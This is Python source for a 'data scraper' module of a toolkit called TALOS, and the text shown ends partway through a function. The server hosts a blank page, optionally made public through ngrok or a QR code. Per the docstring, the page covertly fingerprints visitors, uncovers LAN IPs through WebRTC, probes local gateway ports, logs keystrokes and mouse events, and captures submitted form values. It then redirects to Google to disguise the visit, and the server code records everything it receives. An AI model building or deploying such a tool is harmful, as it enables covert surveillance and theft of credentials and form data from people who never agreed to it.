"""TALOS — DATA SCRAPER (local browser diagnostics & event logger).

Serves a **blank** diagnostics page on **every interface** (``0.0.0.0:<port>``)
— there is nothing for the visitor to see — and streams *every* incoming
request with a timestamp, the client IP and the request details into the
hosting terminal window.  The machine's LAN IP is detected and printed, so
**every device on the network** can open ``http://<lan-ip>:<port>``.

How it is meant to be used
--------------------------
1. Pick module **40** in the menu and answer the configuration prompts
   (port, redirect URL, QR code, ngrok, verbosity).
2. The wrapper opens a **new terminal window** (konsole / gnome-terminal /
   xterm on Linux, Terminal.app on macOS, a ``cmd`` window on Windows) that
   runs the server in the foreground.  It binds **all interfaces** and prints
   the machine's LAN URL — any device on the network can connect to it — and
   it can also be port-forwarded (e.g. ``ssh -R``, or ``--ngrok`` for a
   public URL).
3. Every connection is logged **in that window** in real time as structured
   blocks (request number, timestamp, method, path, client IP, key headers,
   body preview) plus COLLECT blocks with aligned data rows and EVENT lines.
4. The server stays online until that terminal window is closed — closing
   it kills the process and the site goes offline.  Ctrl+C inside the
   window stops it the same way.

What the served page collects (and POSTs back to ``/collect`` / ``/log``):

* **browser environment** — user-agent, platform, languages, screen/viewport
  dimensions, colour depth, timezone, hardware concurrency, device memory,
  touch support and the WebGL vendor/renderer strings;
* **local network discovery** — private LAN IPs observed through WebRTC
  (``RTCPeerConnection`` ICE candidates);
* **connectivity test** — reachability probes of common local gateway IPs on
  ports 22, 80, 443, 8080, 3306, 5432, 5900 and 6379;
* **browser fingerprint** — vendor, platform, user-agent data, plugin list,
  WebGL, canvas fingerprint, screen/viewport geometry, timezone offset,
  history length and page referrer;
* **network info** — effective connection type, downlink, RTT, and the HTTP
  protocol negotiated (h2 / http/1.1);
* **device extras** (async, best-effort) — media device counts, battery
  state, storage quota/usage and installed common fonts;
* **UI event recorder** — keyboard and mouse events (batched, flushed every
  600 ms);
* **form data capture** — input/select/textarea values intercepted when a
  form is submitted.

The page is intentionally empty: no text, no styling, no console messages —
just the collection script.  Roughly one second after load it silently
redirects the browser to the ``redirect`` URL (configurable; empty disables
the redirect), so the visit looks like an ordinary short page view.

Before accepting connections the module runs a structured **blocker check**
in the hosting window: it verifies the server is reachable on localhost and
on the LAN IP, reports ngrok availability (when requested) and surfaces
active OS firewalls (ufw / firewalld on Linux, Windows Firewall) with the
exact command to open the port.

Engine contract
---------------
:class:`DataScraperModule` follows the framework's ``BaseModule`` contract
(``NAME`` / ``DESCRIPTION`` / ``validate_environment()`` / ``run(context)``),
so the orchestrator auto-discovers it — no registration is needed.  ``run()``
blocks until the user presses Ctrl+C, the process is terminated (the hosting
terminal window was closed), or the ``options.duration`` (seconds, 0 =
forever) elapses, and returns a :class:`ToolResult` summarising what was
captured.

The engine is standard-library only; the optional ``qrcode`` library is
imported lazily with a graceful fallback (plain-URL banner instead of a QR).
The ``ngrok`` binary is located via ``shutil.which()`` and, when present,
exposed through the local ngrok API (``127.0.0.1:4040``); when it is missing
the module simply continues in local-only mode.

The engine never prints directly.  The standalone runner and the spawned
terminal window enable *stdout streaming* (``set_stdout_stream(True)``) so
every connection appears in that terminal; the URL / QR / public URL banner
is shown through a banner callback (``set_banner_callback``), or carried in
``data["banner"]`` / ``data["qr_ascii"]`` for orchestrator-driven runs.

> **Authorised use only.** The page collects browser data from whoever opens
> the URL — only point it at browsers you own or have written permission to
> instrument.
"""
from __future__ import annotations

import io
import ipaddress
import json
import os
import re
import shlex
import shutil
import socket
import subprocess
import sys
import threading
import time
import urllib.request
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import urlparse

from src.core import formatting as fmt
from src.core.context import Session
from src.errors.registry import ErrorCategory, ToolError
from src.models.tool_result import ToolResult
from src.orchestrator import BaseModule

# ---------------------------------------------------------------------------
# constants
# ---------------------------------------------------------------------------
DEFAULT_PORT = 8080
DEFAULT_REDIRECT = "https://www.google.com"

#: Cap on a single POST body (bytes) and on body previews logged/kept.
_MAX_BODY = 1_000_000
_MAX_BODY_PREVIEW = 300
#: Bounded in-memory retention of collected payloads (counts stay exact).
_MAX_COLLECTS_KEPT = 5
_MAX_EVENTS_KEPT = 20

#: ANSI colour per stream level — rendered in the hosting terminal window.
_LEVEL_COLORS = {
    "OK": "\x1b[32m",
    "WARNING": "\x1b[33m",
    "ERROR": "\x1b[31m",
    "EVENT": "\x1b[35m",
}

#: ANSI helpers for the pretty request blocks in the hosting terminal.
_ANSI = {
    "reset": "\x1b[0m",
    "bold": "\x1b[1m",
    "dim": "\x1b[2m",
    "cyan": "\x1b[36m",
    "magenta": "\x1b[35m",
    "green": "\x1b[32m",
    "yellow": "\x1b[33m",
    "white": "\x1b[37m",
}

#: Headers worth surfacing in the request log (everything else is noise).
_INTERESTING_HEADERS = (
    "User-Agent", "Referer", "Origin", "Content-Type", "Accept-Language",
)


# ===========================================================================
# helpers
# ===========================================================================
def _clip(text: str, limit: int) -> str:
    """Clip ``text`` to ``limit`` chars; report when it was truncated."""
    if len(text) <= limit:
        return text
    return f"{text[:limit]}... [truncated {len(text) - limit} chars]"


def _ms_since(start: float) -> float:
    return (time.perf_counter() - start) * 1000.0


def _as_bool(value: Any) -> bool:
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return bool(value)
    return str(value).strip().lower() in ("1", "true", "yes", "on", "y")


def _parse_port(value: Any) -> int:
    """Validate the listen port; raise a categorised ToolError otherwise."""
    try:
        port = int(value)
    except (TypeError, ValueError) as exc:
        raise ToolError(
            f"port must be an integer, got {value!r}",
            category=ErrorCategory.PARSE,
            module="data_scraper",
        ) from exc
    if not 1 <= port <= 65535:
        raise ToolError(
            f"port must be in 1-65535, got {port}",
            category=ErrorCategory.PARSE,
            module="data_scraper",
        )
    return port


def _parse_duration(value: Any) -> float:
    """Auto-stop duration in seconds; 0.0 means 'run until stopped'."""
    if value is None or value == "":
        return 0.0
    try:
        return max(0.0, float(value))
    except (TypeError, ValueError):
        return 0.0


def _try_json(body: bytes) -> Any:
    """Best-effort JSON decode; None when the body is not JSON."""
    try:
        return json.loads(body.decode("utf-8"))
    except (ValueError, UnicodeDecodeError):
        return None


def _make_qr_ascii(text: str) -> str:
    """Render ``text`` as an ASCII QR code (optional dependency).

    Returns "" when the ``qrcode`` library is missing or rendering fails; the
    caller then shows a plain-URL banner instead of the QR block.
    """
    try:
        import qrcode  # optional dependency — wrapped per spec  # noqa: PLC0415
    except ImportError:
        return ""
    try:
        qr = qrcode.QRCode(border=1)
        qr.add_data(text)
        qr.make(fit=True)
        buffer = io.StringIO()
        qr.print_ascii(out=buffer)
        return buffer.getvalue().rstrip("\n")
    except Exception:  # pragma: no cover - defensive
        return ""


def _collect_details(payload: Dict[str, Any]) -> List[Tuple[str, str]]:
    """Structured (label, value) rows summarising one /collect payload."""
    kind = payload.get("type", "environment")
    if kind in ("environment", "environment_update"):
        rows: List[Tuple[str, str]] = []
        ua = payload.get("user_agent")
        if ua:
            rows.append(("ua", _clip(str(ua), 100)))
        platform = payload.get("platform")
        if platform:
            rows.append(("platform", str(platform)))
        vendor = payload.get("vendor")
        if vendor:
            rows.append(("vendor", str(vendor)))
        languages = payload.get("languages") or []
        if languages:
            rows.append(("langs", ", ".join(str(x) for x in languages[:5])))
        timezone = payload.get("timezone")
        if timezone:
            offset = payload.get("timezone_offset")
            offset_text = (
                f" (UTC{int(offset) // -60:+d}h)"
                if isinstance(offset, (int, float))
                else ""
            )
            rows.append(("timezone", f"{timezone}{offset_text}"))
        webdriver = payload.get("webdriver")
        if webdriver:
            rows.append(("webdriver", str(webdriver)))
        plugins = payload.get("plugins") or []
        if plugins:
            rows.append(("plugins", ", ".join(str(p) for p in plugins[:4])))
        connection = payload.get("connection")
        if isinstance(connection, dict):
            rows.append((
                "network",
                f"{connection.get('effective_type', '?')} · "
                f"{connection.get('downlink', '?')} Mb/s · "
                f"rtt={connection.get('rtt', '?')} ms",
            ))
        performance = payload.get("performance")
        if isinstance(performance, dict):
            rows.append((
                "http",
                f"{performance.get('protocol', '?')} · "
                f"ttfb={performance.get('ttfb_ms', '?')} ms",
            ))
        screen = payload.get("screen")
        if isinstance(screen, dict):
            rows.append((
                "screen",
                f"{screen.get('width', '?')}x{screen.get('height', '?')} "
                f"@{screen.get('color_depth', '?')}bit "
                f"{screen.get('orientation') or ''}".strip(),
            ))
        webgl = payload.get("webgl")
        if isinstance(webgl, dict) and webgl.get("renderer"):
            rows.append(("webgl", _clip(str(webgl["renderer"]), 50)))
        lan = payload.get("lan_ips") or []
        if lan:
            rows.append(("lan_ips", ", ".join(str(ip) for ip in lan)))
        connectivity = payload.get("connectivity") or []
        reachable = [
            f"{item.get('gateway')}:{item.get('port')}"
            for item in connectivity
            if item.get("reachable")
        ]
        if reachable:
            rows.append(("reachable", ", ".join(reachable[:8])))
        extras = payload.get("extras")
        if isinstance(extras, dict):
            devices = extras.get("media_devices")
            if isinstance(devices, dict):
                rows.append((
                    "devices",
                    f"cam={devices.get('videoinput', 0)} "
                    f"mic={devices.get('audioinput', 0)} "
                    f"spk={devices.get('audiooutput', 0)}",
                ))
            storage = extras.get("storage")
            if isinstance(storage, dict):
                rows.append((
                    "storage",
                    f"{_human_bytes(storage.get('usage', 0))} / "
                    f"{_human_bytes(storage.get('quota', 0))}",
                ))
            battery = extras.get("battery")
            if isinstance(battery, dict):
                rows.append((
                    "battery",
                    f"{battery.get('level', '?')}% "
                    f"{'charging' if battery.get('charging') else 'on battery'}",
                ))
            fonts = extras.get("fonts")
            if fonts:
                rows.append(("fonts", ", ".join(str(f) for f in fonts[:6])))
            canvas_fp = extras.get("canvas_fp")
            if canvas_fp:
                rows.append(("canvas_fp", str(canvas_fp)))
        return rows
    if kind == "form_data":
        fields = payload.get("fields") or {}
        return [
            ("action", _clip(str(payload.get("action") or ""), 80)),
            ("fields", ", ".join(str(k) for k in list(fields)[:8]) or "(none)"),
        ]
    return [
        ("type", kind),
        ("raw", _clip(json.dumps(payload, default=str), 200)),
    ]


def _collect_summary(payload: Dict[str, Any]) -> str:
    """One compact log-file line summarising a /collect payload."""
    return " · ".join(
        f"{label}={value}" for label, value in _collect_details(payload)
    )


def _human_bytes(size: Any) -> str:
    """Render a byte count as a compact human-readable value."""
    try:
        size = float(size)
    except (TypeError, ValueError):
        return str(size)
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if size < 1024 or unit == "TB":
            return f"{size:.0f}{unit}" if unit == "B" else f"{size:.1f}{unit}"
        size /= 1024.0
    return str(size)


def _event_line(event: Any) -> str:
    """One compact log line summarising a recorded UI event."""
    if not isinstance(event, dict):
        return _clip(str(event), 120)
    kind = event.get("type", "event")
    target = str(event.get("target") or "")
    if kind == "keydown":
        return f"key={event.get('key')!r} target={_clip(target, 60)}"
    if kind == "click":
        return f"click target={_clip(target, 60)} at=({event.get('x')},{event.get('y')})"
    return f"{kind} {_clip(json.dumps(event, default=str), 160)}"


def _display_command(argv: List[str]) -> str:
    """Render ``argv`` as a copy-pasteable command for the current OS."""
    if os.name == "nt":
        return subprocess.list2cmdline(argv)
    return " ".join(shlex.quote(part) for part in argv)


def _is_private_ipv4(value: str) -> bool:
    """True for private, non-loopback IPv4 addresses."""
    try:
        address = ipaddress.ip_address(value)
    except ValueError:
        return False
    return (
        address.version == 4
        and address.is_private
        and not address.is_loopback
        and not address.is_link_local
    )


def _lan_ips() -> List[str]:
    """Private IPv4 addresses of this machine (best effort, no packets sent).

    The primary source is the UDP connect() trick: connecting a UDP socket to
    a public address selects the outbound interface without sending anything.
    Hostname enumeration is used as a fallback.
    """
    candidates: List[str] = []
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(("8.8.8.8", 80))
            primary = sock.getsockname()[0]
        if _is_private_ipv4(primary):
            candidates.append(primary)
    except OSError:
        pass
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            candidate = info[4][0]
            if _is_private_ipv4(candidate) and candidate not in candidates:
                candidates.append(candidate)
    except OSError:
        pass
    return candidates


def _tcp_reachable(host: str, port: int) -> bool:
    """True when a TCP connection to host:port succeeds within 1.5s."""
    try:
        with socket.create_connection((host, port), timeout=1.5):
            return True
    except OSError:
        return False


def _firewall_status(port: int) -> List[str]:
    """Best-effort OS firewall status lines (never raises, may be empty)."""
    lines: List[str] = []
    if os.name == "nt":
        try:
            result = subprocess.run(
                ["netsh", "advfirewall", "show", "allprofiles", "state"],
                capture_output=True, text=True, timeout=5,
            )
            states = re.findall(
                r"state\s+(on|off)", (result.stdout + result.stderr).lower()
            )
            if states and any(state == "on" for state in states):
                lines.append(
                    f"Windows Firewall is ON — allow inbound TCP {port} if "
                    "devices cannot connect"
                )
            elif states:
                lines.append("Windows Firewall OFF")
        except (OSError, subprocess.TimeoutExpired):
            pass
        return lines
    if sys.platform != "linux":
        return lines
    checks = (("ufw", "status"), ("firewall-cmd", "--state"))
    for binary, argument in checks:
        path = shutil.which(binary)
        if path is None:
            continue
        try:
            result = subprocess.run(
                [path, argument], capture_output=True, text=True, timeout=5
            )
        except (OSError, subprocess.TimeoutExpired):
            continue
        output = (result.stdout + result.stderr).lower().strip()
        if binary == "ufw":
            if "status: active" in output:
                lines.append(
                    f"ufw is ACTIVE — open the port with: sudo ufw allow {port}/tcp"
                )
            elif "inactive" in output:
                lines.append("ufw inactive")
        elif "running" in output:
            lines.append(
                f"firewalld is RUNNING — open the port with: "
                f"sudo firewall-cmd --add-port={port}/tcp"
            )
        elif "not running" in output:
            lines.append("firewalld not running")
    return lines


def _check_blockers(
    port: int,
    lan_ips: List[str],
    ngrok_requested: bool,
    public_url: str,
) -> List[str]:
    """Structured blocker check: reachability, ngrok and OS firewalls."""
    lines: List[str] = []
    if _tcp_reachable("127.0.0.1", port):
        lines.append(f"[OK]   localhost    http://127.0.0.1:{port}")
    else:
        lines.append(
            f"[!!]   localhost    http://127.0.0.1:{port} NOT reachable — "
            "server failed to start"
        )
    for lan_ip in lan_ips[:2]:
        if _tcp_reachable(lan_ip, port):
            lines.append(f"[OK]   LAN          http://{lan_ip}:{port}")
        else:
            lines.append(
                f"[!!]   LAN          http://{lan_ip}:{port} NOT reachable — "
                "firewall may be blocking it"
            )
    if ngrok_requested:
        if public_url:
            lines.append(f"[OK]   ngrok        {public_url}")
        else:
            lines.append(
                "[--]   ngrok        requested but no tunnel appeared "
                "(binary missing or API unreachable)"
            )
    else:
        lines.append("[--]   ngrok        not requested (local network only)")
    for firewall_line in _firewall_status(port):
        lines.append(f"[!]    firewall     {firewall_line}")
    if not lines:
        lines.append("[--]   no blockers detected")
    return lines


def _compact_request(
    client: str,
    method: str,
    path: str,
    query: str,
    headers: Dict[str, str],
    preview: str,
    note: str,
) -> str:
    """One compact log-file line summarising a request."""
    bits = [f"client={client} {method} {path}"]
    if query:
        bits.append(f"query={query}")
    by_lower = {key.lower(): value for key, value in headers.items()}
    interesting = {
        key: by_lower[key.lower()]
        for key in _INTERESTING_HEADERS
        if key.lower() in by_lower
    }
    if interesting:
        bits.append(
            "headers="
            + ", ".join(f"{k}={v}" for k, v in sorted(interesting.items()))
        )
    if preview:
        bits.append(f"body={preview}")
    if note:
        bits.append(note)
    return " ".join(bits)


# ===========================================================================
# HTTP layer
# ===========================================================================
class _DebugServer(ThreadingHTTPServer):
    """Threaded localhost server that carries a handle on its module."""

    allow_reuse_address = True
    daemon_threads = True


class _DebugHandler(BaseHTTPRequestHandler):
    """Serves the diagnostics page and ingests /collect and /log POSTs.

    Every request (served page, endpoint POSTs, favicons, probes, anything)
    is streamed through :meth:`DataScraperModule.log_request` so the
    operator sees full request visibility, exactly as the spec asks.
    """

    #: One request per connection keeps the threaded server simple and robust
    #: (no keep-alive threads accumulating); browsers handle this transparently.
    protocol_version = "HTTP/1.0"
    server_version = "TALOS-DataScraper/1.0"

    @property
    def module(self) -> "DataScraperModule":
        return self.server.module  # type: ignore[attr-defined]

    # ------------------------------------------------------------------
    # verb handlers
    # ------------------------------------------------------------------
    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        if parsed.path in ("/", "/index.html"):
            self._serve_payload()
        else:
            # Full request visibility: log, then answer 404 for anything else.
            self._log_request("GET", parsed, b"")
            self._respond(404, b"not found", content_type="text/plain")

    def do_HEAD(self) -> None:
        parsed = urlparse(self.path)
        self._log_request("HEAD", parsed, b"")
        self._respond(200, b"", content_type="text/html; charset=utf-8")

    def do_POST(self) -> None:
        parsed = urlparse(self.path)
        length = int(self.headers.get("Content-Length") or 0)
        length = max(0, min(length, _MAX_BODY))
        body = self.rfile.read(length) if length else b""
        self._log_request("POST", parsed, body)
        client = self.client_address[0] if self.client_address else "?"
        if parsed.path == "/collect":
            self.module.record_collect(client, body)
        elif parsed.path == "/log":
            self.module.record_log(client, body)
        # Endpoint POSTs always answer ok; unknown POST targets are logged
        # above and answered with the same payload so the client never waits.
        self._respond(200, b'{"ok": true}', content_type="application/json")

    # ------------------------------------------------------------------
    # helpers
    # ------------------------------------------------------------------
    def _serve_payload(self) -> None:
        parsed = urlparse(self.path)
        self._log_request("GET", parsed, b"", note="served diagnostics page")
        body = self.module.page.encode("utf-8")
        self._respond(200, body, content_type="text/html; charset=utf-8")

    def _log_request(
        self,
        method: str,
        parsed: Any,
        body: bytes,
        note: str = "",
    ) -> None:
        client = self.client_address[0] if self.client_address else "?"
        headers = {key: value for key, value in self.headers.items()}
        self.module.log_request(
            client, method, parsed.path, parsed.query, headers, body, note
        )

    def _respond(
        self,
        code: int,
        body: bytes,
        content_type: str = "application/json",
    ) -> None:
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        if self.command != "HEAD" and body:
            self.wfile.write(body)

    def log_message(self, _fmt: str, *args: Any) -> None:
        """Silence the base class's stderr spam — we log requests ourselves."""
        del _fmt, args


# ===========================================================================
# the engine module
# ===========================================================================
class DataScraperModule(BaseModule):
    """Local browser diagnostics & event logger (interactive server module)."""

    NAME = "data_scraper"
    DESCRIPTION = (
        "Local data scraper — serves a blank page on all interfaces that "
        "silently collects browser fingerprints, LAN IPs, connectivity "
        "probes, UI events and form data, streaming every connection to its "
        "terminal window with a blocker check (authorised use only)"
    )

    def __init__(self) -> None:
        super().__init__()
        self._banner_callback: Optional[Callable[[List[str]], None]] = None
        self._stdout_stream = False
        self._reset_state()

    # ------------------------------------------------------------------
    # runner hooks
    # ------------------------------------------------------------------
    def set_banner_callback(self, callback: Callable[[List[str]], None]) -> None:
        """Attach a callable that renders the startup banner (URL / QR / ngrok).

        The engine never prints; the standalone runner passes a callback that
        writes these lines to stdout the moment the server is up.
        Orchestrator-driven runs omit it and read the same lines from
        ``data["banner"]`` in the returned result.
        """
        self._banner_callback = callback

    def set_stdout_stream(self, enabled: bool) -> None:
        """Enable live request streaming to stdout.

        Used by the standalone runner so every connection shows up in the
        terminal window that hosts the server.  Framework log writes are
        always active regardless of this flag.
        """
        self._stdout_stream = bool(enabled)

    # ------------------------------------------------------------------
    # contract
    # ------------------------------------------------------------------
    @classmethod
    def validate_environment(cls) -> None:
        """The engine is standard-library only — nothing to preflight.

        Optional extras (``qrcode``, the ``ngrok`` binary) degrade gracefully
        at runtime and are never required for the module to work.
        """

    # ------------------------------------------------------------------
    def run(self, context: Dict[str, Any]) -> ToolResult:
        start = time.perf_counter()
        try:
            return self._run_inner(context, start)
        except ToolError as exc:
            # Port conflict / bad options — nothing to summarise.
            self.stop()
            return ToolResult.from_tool_error(
                self.NAME, exc, duration_ms=_ms_since(start)
            )
        except KeyboardInterrupt:
            # Ctrl+C is the normal way to end an interactive session: stop the
            # server and report everything captured so far.
            self.logger.info("data scraper interrupted by the user; shutting down")
            self.stop()
            return ToolResult.success(
                self.NAME, data=self._summary(), duration_ms=_ms_since(start)
            )
        except Exception as exc:  # pragma: no cover - defensive
            self.stop()
            self.logger.exception("data scraper crashed")
            return ToolResult.failed(
                self.NAME,
                f"unexpected data scraper failure: {exc!r}",
                category=ErrorCategory.RESOURCE,
                duration_ms=_ms_since(start),
            )

    # ------------------------------------------------------------------
    def _run_inner(self, context: Dict[str, Any], start: float) -> ToolResult:
        """Parse options, bring the server up, then wait until stopped."""
        options = dict(context.get("options") or {})
        port = _parse_port(options.get("port"))
        # None -> framework default; "" -> redirect disabled (the page stays
        # open).  The menu/script pass an explicit string either way.
        raw_redirect = options.get("redirect")
        redirect = (
            str(raw_redirect).strip()
            if raw_redirect is not None
            else DEFAULT_REDIRECT
        )
        qrcode = _as_bool(options.get("qrcode", False))
        ngrok = _as_bool(options.get("ngrok", False))
        verbose = _as_bool(options.get("verbose", False))
        duration = _parse_duration(options.get("duration"))
        if verbose:
            # Pass verbosity through to the framework logger (stream handler).
            from src.logging_utils import set_logging

            set_logging(verbose=True)

        self._reset_state()
        self._redirect = redirect
        self._qrcode = qrcode
        self._page = _build_page(redirect)
        self._port = port
        self._lan_ips = _lan_ips()
        self._ngrok_requested = ngrok
        self._url = f"http://127.0.0.1:{port}"

        # ---- 1) bind on ALL interfaces so every device on the network can
        #      connect; localhost keeps working via the loopback address. ---
        try:
            server = _DebugServer(("0.0.0.0", port), _DebugHandler)
        except OSError as exc:
            raise ToolError(
                f"cannot bind port {port}: {exc}",
                category=ErrorCategory.RESOURCE,
                module=self.NAME,
            ) from exc
        server.module = self
        self._server = server
        self._server_thread = threading.Thread(
            target=server.serve_forever,
            daemon=True,
            name="data-scraper-http",
        )
        self._server_thread.start()
        self.logger.info(
            "data scraper listening on 0.0.0.0:%d (LAN IPs: %s)",
            port, ", ".join(self._lan_ips) or "none detected",
        )

        # ---- 2) optional public tunnel via ngrok (if installed) ---------
        public_url = ""
        if ngrok:
            public_url = self._start_ngrok(port)
            self._public_url = public_url
            if public_url:
                self.logger.info("ngrok tunnel: %s", public_url)

        # ---- 3) startup banner (URL / QR / public URL) via the callback --
        self._emit_banner(qrcode, public_url)

        # ---- 4) wait until stopped / duration elapsed / Ctrl+C ----------
        # The server lives inside the terminal window that started it:
        # closing that window terminates this process (and with it the
        # server), which is the intended way to take the page offline.
        self.report_progress(
            f"serving {self._url} — connections stream below; Ctrl+C (or "
            "close this window) to stop",
            None,
        )
        try:
            while True:
                if duration and (time.perf_counter() - start) >= duration:
                    self.logger.info(
                        "duration of %.1fs elapsed; stopping", duration
                    )
                    break
                if self._stop_event.is_set():
                    break
                time.sleep(0.5)
        finally:
            self.stop()
        return ToolResult.success(
            self.NAME, data=self._summary(), duration_ms=_ms_since(start)
        )

    # ------------------------------------------------------------------
    # startup helpers
    # ------------------------------------------------------------------
    def _emit_banner(self, qrcode: bool, public_url: str) -> None:
        """Build the startup banner (URLs, QR, blocker check) and print it."""
        divider = "  " + "─" * 52
        banner: List[str] = [divider, "  DATA SCRAPER"]
        urls = [
            f"http://{ip}:{self._port}" for ip in ("127.0.0.1", *self._lan_ips)
        ]
        for index, url in enumerate(urls):
            note = (
                "(LAN — every device on this network can connect)"
                if index
                else "(this machine only)"
            )
            banner.append(f"  {url}   {note}")
        if qrcode:
            # QR of the LAN URL when available (scan from a phone on the WiFi).
            qr_text = urls[1] if len(urls) > 1 else urls[0]
            ascii_qr = _make_qr_ascii(qr_text)
            self._qr_ascii = ascii_qr
            if ascii_qr:
                banner.append(ascii_qr)
            else:
                banner.append(
                    "  could not render a QR code — "
                    f"install it with: {sys.executable} -m pip install qrcode"
                )
        if public_url:
            banner.append(f"  public URL  ·  {public_url}")
        banner.append(
            "  waiting for connections — close this window (or Ctrl+C) to stop"
        )
        banner.append(divider)
        banner.append("  BLOCKER CHECK")
        blocker_lines = _check_blockers(
            self._port, self._lan_ips, self._ngrok_requested, public_url
        )
        self._blockers = blocker_lines
        banner.extend(blocker_lines)
        banner.append(divider)
        self._banner = banner
        if self._banner_callback is not None:
            try:
                self._banner_callback(banner)
            except Exception:  # pragma: no cover - a broken banner never kills
                pass

    def _start_ngrok(self, port: int) -> str:
        """Start ``ngrok http <port>`` and return the public URL, or ''.

        The public URL is read from ngrok's local API (127.0.0.1:4040); when
        the binary is absent or the tunnel does not come up in ~7.5s the
        module logs a warning and continues local-only.
        """
        binary = shutil.which("ngrok")
        if binary is None:
            self.logger.warning(
                "ngrok requested but the 'ngrok' binary was not found; "
                "continuing local-only"
            )
            return ""
        try:
            proc = subprocess.Popen(
                [binary, "http", str(port)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except OSError as exc:
            self.logger.warning("could not start ngrok: %s", exc)
            return ""
        self._ngrok_proc = proc
        for _ in range(30):
            time.sleep(0.25)
            url = _ngrok_public_url()
            if url:
                return url
        self.logger.warning(
            "ngrok started but no public URL appeared on the local API; "
            "continuing local-only"
        )
        return ""

    # ------------------------------------------------------------------
    # request intake (called from the HTTP handler threads)
    # ------------------------------------------------------------------
    def log_request(
        self,
        client: str,
        method: str,
        path: str,
        query: str,
        headers: Dict[str, str],
        body: bytes,
        note: str = "",
    ) -> None:
        """Stream one full request record (method, query, headers, body)."""
        with self._lock:
            self._request_count += 1
            self._clients.add(client)
            request_number = self._request_count
        preview = _clip(body.decode("utf-8", "replace"), _MAX_BODY_PREVIEW)
        # Framework log: one compact line per request.
        self._log_framework(
            "request "
            + _compact_request(client, method, path, query, headers, preview, note)
        )
        if self._stdout_stream:
            self._print_request(
                request_number, client, method, path, query, headers, preview, note
            )

    def record_collect(self, client: str, body: bytes) -> None:
        """Ingest one /collect payload (environment / connectivity / form).

        ``environment_update`` payloads (the page posts environment, then LAN
        IPs / probes / extras as they finish) are merged into the latest
        environment record for the same client, so the final summary holds the
        full picture.
        """
        payload = _try_json(body)
        with self._lock:
            self._collect_count += 1
            if (
                isinstance(payload, dict)
                and payload.get("type") == "environment_update"
                and self._collects
                and self._collects[-1].get("ip") == client
                and isinstance(self._collects[-1].get("payload"), dict)
            ):
                merged = dict(self._collects[-1]["payload"])
                merged.update({k: v for k, v in payload.items() if k != "type"})
                self._collects[-1]["payload"] = merged
            else:
                self._collects.append(
                    {
                        "ip": client,
                        "payload": payload
                        or {"raw": _clip(body.decode("utf-8", "replace"), 400)},
                    }
                )
            del self._collects[:-_MAX_COLLECTS_KEPT]
        summary = (
            _collect_summary(payload) if isinstance(payload, dict) else "non-JSON payload"
        )
        self._log_framework(f"collect client={client} {summary}")
        if self._stdout_stream:
            self._print_collect(client, payload)

    def record_log(self, client: str, body: bytes) -> None:
        """Ingest one /log payload (real-time UI events, batched by the page)."""
        payload = _try_json(body)
        with self._lock:
            self._log_count += 1
            self._events.append(
                {
                    "ip": client,
                    "payload": payload
                    or {"raw": _clip(body.decode("utf-8", "replace"), 400)},
                }
            )
            del self._events[:-_MAX_EVENTS_KEPT]
        if isinstance(payload, dict):
            events = payload.get("events")
            if isinstance(events, list):
                for event in events[:20]:
                    line = _event_line(event)
                    self._log_framework(f"event client={client} {line}")
                    self.stream(f"EVENT · {client} · {line}", level="EVENT")
            else:
                detail = _clip(json.dumps(payload, default=str), 300)
                self._log_framework(f"log client={client} {detail}")
                self.stream(f"LOG · {client} · {detail}", level="EVENT")
        else:
            detail = _clip(body.decode("utf-8", "replace"), 300)
            self._log_framework(f"log client={client} {detail}")
            self.stream(f"LOG · {client} · {detail}", level="EVENT")

    # ------------------------------------------------------------------
    # streaming + lifecycle
    # ------------------------------------------------------------------
    def _log_framework(self, line: str, level: str = "INFO") -> None:
        """Write one line to the rotating framework log (always active)."""
        if level == "WARNING":
            self.logger.warning("%s", line)
        elif level == "ERROR":
            self.logger.error("%s", line)
        else:
            self.logger.info("%s", line)

    def stream(self, line: str, level: str = "INFO") -> None:
        """Print one live line into the hosting terminal (when streaming).

        Single-line events (COLLECT / EVENT / LOG summaries) render here,
        colour-coded by level on a real TTY.  Request records use the richer
        :meth:`_print_request` block instead.
        """
        if not self._stdout_stream:
            return
        stamp = datetime.now().strftime("%H:%M:%S")
        if sys.stdout.isatty():
            color = _LEVEL_COLORS.get(level, "")
            reset = "\x1b[0m" if color else ""
            print(f"  {color}[{stamp}]{reset} {line}")
        else:
            print(f"  [{stamp}] {line}")

    def _print_request(
        self,
        number: int,
        client: str,
        method: str,
        path: str,
        query: str,
        headers: Dict[str, str],
        preview: str,
        note: str,
    ) -> None:
        """Pretty request block for the hosting terminal.

        One header line (#number, timestamp, method, path, client, note)
        followed by indented detail rows for the interesting headers and the
        body preview — the noise of every header is left out of the live view.
        """
        stamp = datetime.now().strftime("%H:%M:%S")
        tty = sys.stdout.isatty()
        c = _ANSI
        if tty:
            method_color = {
                "GET": c["cyan"], "POST": c["magenta"], "HEAD": c["yellow"],
            }.get(method, c["bold"])
            head = (
                f"  {c['dim']}#{number} {c['reset']}{c['dim']}[{stamp}]{c['reset']}"
                f" {method_color}{method}{c['reset']}"
                f" {c['bold']}{path}{c['reset']} {c['dim']}· {client}{c['reset']}"
            )
            if note:
                head += f" {c['dim']}· {note}{c['reset']}"
        else:
            head = f"  #{number} [{stamp}] {method} {path} · {client}"
            if note:
                head += f" · {note}"
        print(head)
        by_lower = {key.lower(): value for key, value in headers.items()}
        details: List[Tuple[str, str]] = []
        if query:
            details.append(("query", query))
        for key in _INTERESTING_HEADERS:
            value = by_lower.get(key.lower())
            if value:
                details.append((key, _clip(value, 120)))
        if preview:
            details.append(("body", preview))
        if details:
            width = max(len(label) for label, _ in details)
            for label, value in details:
                if tty:
                    print(f"  {c['dim']}│{c['reset']} {label.ljust(width)}  {value}")
                else:
                    print(f"  |  {label.ljust(width)}  {value}")

    def _print_collect(self, client: str, payload: Any) -> None:
        """Pretty /collect block for the hosting terminal (aligned data rows)."""
        stamp = datetime.now().strftime("%H:%M:%S")
        tty = sys.stdout.isatty()
